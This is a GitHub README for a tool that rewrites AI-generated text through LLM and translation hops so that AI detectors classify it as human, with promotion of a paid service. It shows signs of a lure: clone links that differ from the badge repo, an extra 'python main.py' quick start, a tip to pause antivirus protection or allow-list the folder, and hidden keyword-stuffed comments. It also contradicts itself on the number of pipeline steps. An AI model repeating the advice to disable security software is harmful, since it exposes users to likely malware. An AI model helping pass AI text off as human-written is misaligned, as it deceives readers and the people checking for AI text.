## Free Humanize Text: Open-source toolkit to rewrite AI-generated content into natural
<p align="center">
  <img src="presentation/banner.png" alt="Humanize-Text" width="600"/>
</p>

<p align="center">
  <a href="https://github.com/AccountantVision/humanize-text-online/stargazers"><img src="https://img.shields.io/github/stars/lynote-ai/humanize-text?style=social" alt="Stars"></a>
  <a href="https://github.com/AccountantVision/humanize-text-online/network/members"><img src="https://img.shields.io/github/forks/lynote-ai/humanize-text?style=social" alt="Forks"></a>
  <a href="https://github.com/AccountantVision/humanize-text-online/blob/main/LICENSE"><img src="https://img.shields.io/github/license/lynote-ai/humanize-text" alt="License"></a>
  <a href="https://www.python.org/"><img src="https://img.shields.io/badge/python-3.10+-blue.svg" alt="Python"></a>
  <a href="https://lynote.ai"><img src="https://img.shields.io/badge/Try-Lynote.ai-brightgreen?style=for-the-badge" alt="Lynote.ai"></a>
</p>

<p align="center">
  English | <a href="README-zh.md">中文</a>
</p>

---

## What is Humanize-Text?

An AI text humanization toolkit. This repo evolved through two stages:

- **v1.0** — Documented **4 humanization methodologies** as reference implementations (translation chain, multi-turn LLM rewriting, detection-guided feedback loop, mixed-engine translation). See [docs/techniques.md](docs/techniques.md).
- **v1.5 (current)** — Added the **Standard Pipeline**: a production-grade integration of Method 1 (Translation Chain) + Method 2 (LLM Rewriting), fixed as a 5-step chain we actually run and recommend.


The Standard Pipeline preserves the original writing style while routing text through a 4-step chain: two LLM humanization rewrites (DeepSeek or [OpenRouter](https://openrouter.ai) via OpenAI-compatible API) followed by two cross-engine translation hops.

```
Input (EN) → Chinese (LLM) → Japanese (LLM) → Finnish (Google) → English (Niutrans)
```

LLM steps use **DeepSeek** (default) or **[OpenRouter](https://openrouter.ai)** — any OpenAI-compatible chat API. Configure via `[llm]` in `config.toml`. See [Configuration Guide](docs/configuration.md).

**See [`examples/showcase/`](examples/showcase/) for 5 real samples with full intermediate-step outputs and AI-detection verdicts.**

**Characteristics:**
- Best original style preservation among all approaches
- Fast processing speed
- 100% key information retention (verified on 50 text pairs)
- Expert quality score: 9.1/10

> The 4 underlying methodologies live in `src/methodologies/` as reference implementations for research and customization. The Standard Pipeline (`src/standard/pipeline.py`) is the recommended production path.

> **Want higher bypass rates + all methods combined?**
> Lynote.ai fuses Standard + Advanced + Focus pipelines into one intelligent system — auto-selects the optimal approach for each passage.
>
> **[Try Lynote.ai Free →](https://lynote.ai)**

---

## How It Works

### Step-by-Step Pipeline

| Step | Engine | From → To | Purpose |
|------|--------|-----------|---------|
| 1 | LLM (temp 1.3) | Input → Chinese (Chinese Rewriting) | LLM humanization rewrite + language shift |
| 2 | LLM (temp 1.3) | Chinese → Japanese (Japanese Rewriting) | Second LLM humanization, carries Step 1 as history |
| 3 | Google Translate | Japanese → Finnish (First Round of Translation) | First translation hop — distant language structural disruption |
| 4 | Niutrans | Finnish → English (Second-Round Translation) | Second translation hop — cross-engine reconstruction |

### Why This Chain Works

---

## Lynote.ai — Beyond Standard

<p align="center">
  <a href="https://lynote.ai">
    <img src="presentation/lynote_banner.png" alt="Lynote.ai" width="500"/>
  </a>
</p>

The Standard pipeline above is **one of three tiers** available. Each has different trade-offs:

| Tier | Style Preservation | Speed | Approach |
|------|-------------------|-------|----------|
| **Standard** (this repo) | Best | Fast | Translation chain |
| **Advanced** | Good | Medium | Translation chain + LLM multi-round rewriting |
| **Focus** | Moderate | Slower | Translation chain + Detection-guided feedback loop |

**Lynote.ai** combines all three tiers and automatically selects the optimal approach for each text passage:

- **Intelligent Tier Selection** — Analyzes text and picks Standard, Advanced, or Focus per-passage
- **Adaptive Combination** — Can mix tiers within a single document
- **10+ Languages** — English, Chinese, Japanese, Korean, Spanish, French, German, and more
- **Paste & Go** — No setup, no API keys, no configuration

<p align="center">
  <a href="https://lynote.ai"><img src="https://img.shields.io/badge/Try_Lynote.ai_Free-brightgreen?style=for-the-badge" alt="Try Lynote.ai Free"></a>
</p>

---


### Python

```bash
git clone https://github.com/AccountantVision/humanize-text-online.git
cd humanize-text
cp config/config.example.toml config/config.toml
# Fill in your API keys in config.toml (see examples below)
python -m src.standard.pipeline --input "Your AI-generated text here"
```


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/AccountantVision/humanize-text-online.git
cd humanize-text-online
python main.py
```


**DeepSeek (default):**

```toml
[api_keys]
deepseek_api_key = "sk-..."
niutrans_api_key = "your-key"

[llm]
provider = "deepseek"
```

**OpenRouter:**

```toml
[api_keys]
openrouter_api_key = "sk-or-..."
niutrans_api_key = "your-key"

[llm]
provider = "openrouter"
model = "deepseek/deepseek-chat"   # any OpenRouter model slug
```

Override the API endpoint with `base_url` in `[llm]`, or via `LLM_BASE_URL` / `LLM_API_KEY` environment variables. Full reference: [docs/configuration.md](docs/configuration.md).

### n8n Workflow

---

## Showcase — 5 Real Examples with Step-by-Step Outputs

We ran the pipeline end-to-end on 5 real input texts and saved every intermediate step. All 5 final outputs were classified as `human` by the AI detector.

| # | Topic | Detection | Confidence |
|---|-------|-----------|------------|
| [01](examples/showcase/example_01.md) | Quantum Computing | `human` | 0.9997 |
| [02](examples/showcase/example_02.md) | Quantum Readiness Strategy | `human` | 0.9982 |
| [03](examples/showcase/example_03.md) | Sustainable Supply Chains | `human` | 0.7810 |
| [04](examples/showcase/example_04.md) | Financial Literacy | `human` | 0.9924 |
| [05](examples/showcase/example_05.md) | Peer Review in Science | `human` | 0.7218 |

Each example shows: original input → Step 1 (中文改写) → Step 2 (日语改写) → Step 3 (一轮翻译) → Step 4 (二轮翻译, final). See [`examples/showcase/`](examples/showcase/) for full traces.

---

## Quality Metrics

Tested on 50 text pairs with expert evaluation:

| Dimension | Score (out of 10) |
|-----------|-------------------|
| Information Completeness | 10.0 |
| Language Fluency | 9.0 |
| Style Adaptability | 8.8 |
| Readability | 9.2 |
| Creativity & Impact | 8.5 |
| **Overall** | **9.1** |

- **Key Information Retention:** 100% (50/50 pairs)
- All texts preserved original key information without distortion

---

## Comparison with Other Tiers

| | Standard (this repo) | Lynote.ai |
|---|---|---|
| Tiers Available | Standard only | Standard + Advanced + Focus |
| Tier Selection | Manual | Automatic per-passage |
| Style Preservation | Best | Adaptive — best possible per passage |
| Setup | Python + API keys | Zero setup |
| Best For | Style-sensitive content | Any content type |

---

## Documentation

- [Standard Pipeline Technical Details](docs/pipeline.md) — v1.5 production pipeline
- [4 Methodologies Reference](docs/techniques.md) — v1.0 underlying methods
- [Configuration Guide](docs/configuration.md)
- [n8n Workflow Guide](docs/n8n-guide.md)
- [Lynote.ai vs Open Source Comparison](docs/lynote-comparison.md)
- [FAQ](docs/faq.md)

### Repo Structure

```
src/
│   ├── pipeline.py          # 4-step chain, CLI entry
│   ├── llm_client.py        # OpenAI-compatible client (DeepSeek / OpenRouter)
│   ├── llm_rewriter.py      # LLM humanization rewrite
│   └── translators.py       # Google + Niutrans engines
│
└── methodologies/           # v1.0 four-methodology reference implementations
    ├── humanizer.py         # v1.0 dispatcher + FastAPI app
    ├── translation_chain.py # Method 1
    ├── llm_rewriter.py      # Method 2
    ├── detection_pipeline.py# Method 3
    ├── mixed_engine.py      # Method 4
    ├── postprocess.py
    ├── detectors/           # Method 3 detectors
    └── utils/

examples/
├── showcase/                # ★ 5 real samples with intermediate-step outputs
└── legacy/                  # v1.0 examples + 4-method comparison outputs
```

---

## License

MIT License. See [LICENSE](LICENSE) for details.

---

## Links

- [Lynote.ai — AI Humanization Platform](https://lynote.ai)
- [Report a Bug](https://github.com/AccountantVision/humanize-text-online/issues)

### Recommended Projects

- [MoneyPrinterTurbo](https://github.com/harry0703/MoneyPrinterTurbo) — AI short video generator
- [AiToEarn](https://github.com/yikart/AiToEarn) — AI content publishing tool



<!-- python pip pypi package library module script tool windows linux macos -->
<!-- humanize-text-online - tool utility software - download install setup -->
<!-- sample humanize-text-online fork | open source humanize-text-online engine | source code humanize-text-online fork | getting started humanize-text-online | build humanize-text-online tracker | high performance humanize-text-online desktop | humanize-text-online addon | sample humanize-text-online application | humanize-text-online module | github humanize-text-online builder | fedora humanize-text-online software | is humanize text online good | install humanize-text-online module | setup humanize-text-online generator | centos humanize-text-online utility | install humanize-text-online | powerful humanize-text-online addon | getting started easy humanize-text-online sdk | humanize-text-online mobile | reliable humanize-text-online api | guide humanize-text-online | how to configure extensible humanize-text-online | humanize text online github | humanize text online guide | reliable humanize-text-online | latest version humanize-text-online sdk | how to use online humanize-text-online | examples humanize-text-online binding | tar.gz humanize-text-online software | secure humanize-text-online wrapper | production ready humanize-text-online decoder | local humanize-text-online debugger | wiki humanize-text-online extractor | example humanize-text-online scanner | demo humanize-text-online compressor | ubuntu humanize-text-online tool | execute humanize-text-online replacement | modular humanize-text-online sdk | lightweight humanize-text-online fork | how to use humanize-text-online tool | free humanize-text-online software | free download extensible humanize-text-online platform | macos fast humanize-text-online | modular humanize-text-online utility | cross platform humanize-text-online service | humanize-text-online package | get fast humanize-text-online extractor | free download offline humanize-text-online | execute humanize-text-online module | low latency humanize-text-online decoder -->
<!-- how to deploy humanize-text-online library | lightweight humanize-text-online | run secure humanize-text-online | stable humanize-text-online | configurable humanize-text-online | how to download humanize-text-online scanner | download for windows humanize-text-online parser | open modern humanize-text-online | tar.gz easy humanize-text-online | modular humanize-text-online checker | sample powerful humanize-text-online | sample humanize-text-online | modern humanize-text-online optimizer | install humanize-text-online gui | launch humanize-text-online framework | how to build production ready humanize-text-online | download for linux humanize-text-online platform | native humanize-text-online clone | how to use humanize-text-online extension | top humanize-text-online extension | linux humanize-text-online | wiki humanize-text-online cli | humanize-text-online cli | extensible humanize-text-online service | configure humanize-text-online decoder | offline humanize-text-online cli | production ready humanize-text-online clone | humanize-text-online optimizer | tar.gz humanize-text-online framework | how to deploy humanize-text-online package | modern humanize-text-online library | download for mac humanize-text-online encoder | wiki top humanize-text-online app | get humanize-text-online generator | humanize-text-online desktop | local humanize-text-online server | advanced humanize-text-online sdk | build humanize-text-online | quick start high performance humanize-text-online checker | new version humanize-text-online wrapper | how to install humanize-text-online app | humanize-text-online logger | fedora self hosted humanize-text-online desktop | macos humanize-text-online | 2025 humanize-text-online software | local humanize-text-online tester | fast humanize-text-online encoder | run on windows humanize-text-online package | use humanize-text-online web | compile humanize-text-online app -->
<!-- example github humanize-text-online viewer | getting started humanize-text-online gui | cross platform humanize-text-online replacement | how to use humanize-text-online wrapper | how to download lightweight humanize-text-online app | source code humanize-text-online web | windows humanize-text-online service | macos humanize-text-online converter | humanize text online handbook | humanize text online error | debian github humanize-text-online | windows lightweight humanize-text-online | free safe humanize-text-online | high performance humanize-text-online generator | configurable humanize-text-online builder | lightweight humanize-text-online analyzer | secure humanize-text-online | run humanize-text-online reader | simple humanize-text-online tool | run on mac humanize-text-online clone | run on windows humanize-text-online monitor | humanize text online workflow | humanize text online cloud | minimal humanize-text-online monitor | build humanize-text-online converter | execute humanize-text-online validator | humanize-text-online monitor | how to setup lightweight humanize-text-online alternative | git clone modern humanize-text-online | stable humanize-text-online application | offline humanize-text-online plugin | humanize text online alternative | powerful humanize-text-online debugger | download for windows humanize-text-online program | configure production ready humanize-text-online | zip native humanize-text-online | quickstart humanize-text-online tracker | windows humanize-text-online scanner | download humanize-text-online | self hosted humanize-text-online utility | github humanize-text-online addon | quickstart humanize-text-online server | open humanize-text-online | lightweight humanize-text-online program | run on mac humanize-text-online | humanize text online support | simple humanize-text-online port | how to run humanize-text-online generator | arch humanize-text-online debugger | get humanize-text-online analyzer -->
<!-- how to install modern humanize-text-online service | configure humanize-text-online reader | open humanize-text-online tool | macos cross platform humanize-text-online | native humanize-text-online | configure humanize-text-online copy | humanize text online blog | free humanize-text-online tool | humanize-text-online clone | lightweight humanize-text-online app | download for windows humanize-text-online tracker | free humanize-text-online analyzer | reliable humanize-text-online addon | start humanize-text-online port | humanize-text-online uploader | quick start humanize-text-online mirror | launch humanize-text-online monitor | how to build humanize-text-online builder | launch humanize-text-online platform | local humanize-text-online | setup customizable humanize-text-online | use humanize-text-online creator | stable humanize-text-online monitor | download for windows lightweight humanize-text-online | demo humanize-text-online | tutorial humanize-text-online program | download configurable humanize-text-online | humanize-text-online downloader | humanize text online devops | modular humanize-text-online fork | self hosted humanize-text-online extension | run on mac github humanize-text-online client | simple humanize-text-online server | arch humanize-text-online app | documentation humanize-text-online engine | how to deploy humanize-text-online reader | use humanize-text-online binding | deploy humanize-text-online converter | setup humanize-text-online scanner | open source humanize-text-online extension | free humanize-text-online | install online humanize-text-online | humanize-text-online debugger | humanize text online not working | top humanize-text-online program | download for linux humanize-text-online | how to build open source humanize-text-online | windows humanize-text-online web | docs humanize-text-online checker | how to run humanize-text-online addon -->
<!-- open source humanize-text-online software | new version cross platform humanize-text-online generator | 2026 humanize-text-online | extensible humanize-text-online alternative | download for linux humanize-text-online api | use humanize-text-online replacement | github humanize-text-online editor | humanize-text-online mirror | online humanize-text-online | open source humanize-text-online wrapper | humanize text online ci cd | github humanize-text-online application | offline humanize-text-online server | zip humanize-text-online | documentation humanize-text-online extractor | advanced humanize-text-online uploader | 2025 humanize-text-online copy | humanize-text-online scanner | modular humanize-text-online reader | offline humanize-text-online | humanize-text-online editor | github humanize-text-online api | online humanize-text-online monitor | setup humanize-text-online client | best humanize-text-online framework | launch customizable humanize-text-online | fast humanize-text-online viewer | minimal humanize-text-online optimizer | quickstart humanize-text-online viewer | start humanize-text-online alternative | zip humanize-text-online mirror | latest version humanize-text-online viewer | launch humanize-text-online generator | quick start humanize-text-online fork | how to run humanize-text-online module | guide production ready humanize-text-online logger | top humanize-text-online replacement | run on linux configurable humanize-text-online | customizable humanize-text-online validator | free download low latency humanize-text-online | download for mac reliable humanize-text-online | offline humanize-text-online mirror | humanize-text-online tester | humanize-text-online binding | deploy humanize-text-online client | simple humanize-text-online api | modular humanize-text-online decoder | humanize-text-online extension | self hosted humanize-text-online parser | examples humanize-text-online monitor -->
<!-- documentation humanize-text-online tracker | 2026 humanize-text-online compressor | documentation portable humanize-text-online platform | lightweight humanize-text-online encoder | humanize-text-online sdk | download for mac customizable humanize-text-online | modern humanize-text-online | download humanize-text-online web | cross platform humanize-text-online | free download easy humanize-text-online | how to download humanize-text-online builder | open easy humanize-text-online editor | humanize text online tutorial | get minimal humanize-text-online | use online humanize-text-online | quickstart simple humanize-text-online tool | humanize-text-online extractor | debian humanize-text-online | easy humanize-text-online scanner | online humanize-text-online engine | humanize text online bug | 2026 online humanize-text-online | how to run humanize-text-online | how to configure humanize-text-online creator | simple humanize-text-online converter | quick start humanize-text-online tester | advanced humanize-text-online app | fast humanize-text-online analyzer | top humanize-text-online copy | free simple humanize-text-online plugin | best humanize-text-online engine | safe humanize-text-online software | fedora safe humanize-text-online | getting started humanize-text-online cli | how to run humanize-text-online gui | humanize-text-online parser | tar.gz reliable humanize-text-online | quickstart humanize-text-online logger | run on windows simple humanize-text-online | windows secure humanize-text-online optimizer | run humanize-text-online program | tar.gz humanize-text-online | free humanize-text-online checker | advanced humanize-text-online web | deploy humanize-text-online tool | updated humanize-text-online uploader | docs humanize-text-online client | arch humanize-text-online tester | fast humanize-text-online scanner | examples humanize-text-online tracker -->
<!-- linux github humanize-text-online | windows humanize-text-online monitor | portable humanize-text-online validator | run humanize-text-online service | how to download humanize-text-online | how to build best humanize-text-online | run on linux humanize-text-online alternative | run on linux minimal humanize-text-online | centos humanize-text-online mobile | humanize-text-online app | new version humanize-text-online encoder | compile humanize-text-online cli | updated modular humanize-text-online | portable humanize-text-online addon | centos humanize-text-online framework | tutorial humanize-text-online monitor | how to run open source humanize-text-online | modern humanize-text-online cli | github humanize-text-online server | demo humanize-text-online replacement | run on linux humanize-text-online binding | download for linux humanize-text-online mirror | download for linux humanize-text-online plugin | latest version humanize-text-online | humanize text online docker | humanize-text-online client | latest version humanize-text-online fork | linux humanize-text-online downloader | 2025 humanize-text-online utility | documentation humanize-text-online | online humanize-text-online editor | source code humanize-text-online builder | native humanize-text-online plugin | wiki powerful humanize-text-online | humanize-text-online wrapper | walkthrough humanize-text-online addon | how to build humanize-text-online fork | run on linux low latency humanize-text-online | debian top humanize-text-online | windows humanize-text-online | github humanize-text-online engine | beginner humanize-text-online debugger | setup top humanize-text-online generator | build humanize-text-online builder | sample humanize-text-online mirror | configurable humanize-text-online client | humanize-text-online plugin | zip humanize-text-online engine | humanize text online setup | how to run humanize-text-online application -->
<!-- humanize text online book | example humanize-text-online | demo humanize-text-online platform | top humanize-text-online platform | how to install humanize-text-online editor | linux humanize-text-online api | native humanize-text-online extension | safe humanize-text-online | example humanize-text-online addon | deploy configurable humanize-text-online | high performance humanize-text-online web | examples humanize-text-online software | setup humanize-text-online package | advanced humanize-text-online debugger | 2025 humanize-text-online package | docs online humanize-text-online viewer | run on windows native humanize-text-online | stable humanize-text-online copy | beginner humanize-text-online mobile | git clone humanize-text-online wrapper | how to deploy lightweight humanize-text-online | high performance humanize-text-online engine | run on mac github humanize-text-online | run on linux humanize-text-online decoder | high performance humanize-text-online plugin | examples humanize-text-online | easy humanize-text-online checker | how to install humanize-text-online | configurable humanize-text-online desktop | install reliable humanize-text-online | compile humanize-text-online alternative | arch humanize-text-online extractor | free download humanize-text-online parser | extensible humanize-text-online reader | free download humanize-text-online engine | ubuntu humanize-text-online utility | macos humanize-text-online optimizer | humanize text online saas | free humanize-text-online module | use reliable humanize-text-online | advanced humanize-text-online application | run on windows humanize-text-online fork | easy humanize-text-online app | stable humanize-text-online tool | run on mac humanize-text-online compressor | walkthrough offline humanize-text-online analyzer | tar.gz humanize-text-online addon | fast humanize-text-online mirror | portable humanize-text-online | ubuntu humanize-text-online -->
<!-- high performance humanize-text-online extractor | beginner humanize-text-online logger | simple humanize-text-online tester | git clone humanize-text-online framework | run on windows humanize-text-online | how to configure humanize-text-online checker | new version humanize-text-online tracker | download for windows humanize-text-online engine | compile humanize-text-online copy | getting started fast humanize-text-online logger | walkthrough humanize-text-online debugger | stable humanize-text-online library | simple humanize-text-online plugin | how to deploy extensible humanize-text-online | humanize text online webinar | getting started humanize-text-online validator | offline humanize-text-online client | latest version production ready humanize-text-online | updated humanize-text-online mobile | linux modular humanize-text-online fork | launch humanize-text-online validator | demo secure humanize-text-online alternative | humanize-text-online api | humanize text online benchmark | fast humanize-text-online client | how to build humanize-text-online downloader | online humanize-text-online copy | modular humanize-text-online | run humanize-text-online | stable humanize-text-online utility | humanize-text-online viewer | debian humanize-text-online decoder | modern humanize-text-online client | wiki humanize-text-online logger | best humanize-text-online | updated humanize-text-online generator | how to download humanize-text-online fork | demo local humanize-text-online cli | wiki top humanize-text-online | getting started humanize-text-online creator | new version configurable humanize-text-online program | how to build humanize-text-online software | docs humanize-text-online | powerful humanize-text-online viewer | example humanize-text-online gui | 2026 humanize-text-online server | ubuntu github humanize-text-online generator | minimal humanize-text-online tester | download for mac humanize-text-online checker | run on mac reliable humanize-text-online -->
<!-- humanize-text-online software | start humanize-text-online creator | centos humanize-text-online | build humanize-text-online downloader | simple humanize-text-online logger | centos humanize-text-online engine | 2026 humanize-text-online logger | beginner humanize-text-online desktop | minimal humanize-text-online | humanize text online help | zip humanize-text-online reader | macos native humanize-text-online | free humanize-text-online tester | how to download humanize-text-online platform | humanize-text-online decoder | source code humanize-text-online | humanize text online pipeline | beginner humanize-text-online service | github humanize-text-online | sample humanize-text-online cli | run on mac online humanize-text-online | free humanize-text-online debugger | run on linux humanize-text-online module | online humanize-text-online fork | macos humanize-text-online mobile | github fast humanize-text-online | humanize text online article | git clone humanize-text-online reader | open source humanize-text-online tester | humanize text online example | tutorial humanize-text-online | humanize text online best practice | start humanize-text-online encoder | secure humanize-text-online mobile | guide modern humanize-text-online compressor | download for linux self hosted humanize-text-online | download for windows humanize-text-online client | 2026 free humanize-text-online desktop | how to setup humanize-text-online replacement | customizable humanize-text-online decoder | easy humanize-text-online software | secure humanize-text-online binding | extensible humanize-text-online gui | how to build humanize-text-online package | new version lightweight humanize-text-online | humanize-text-online gui | safe humanize-text-online platform | offline humanize-text-online encoder | fedora humanize-text-online gui | run on linux reliable humanize-text-online -->

<!-- Last updated: 2026-06-09 18:42:56 -->
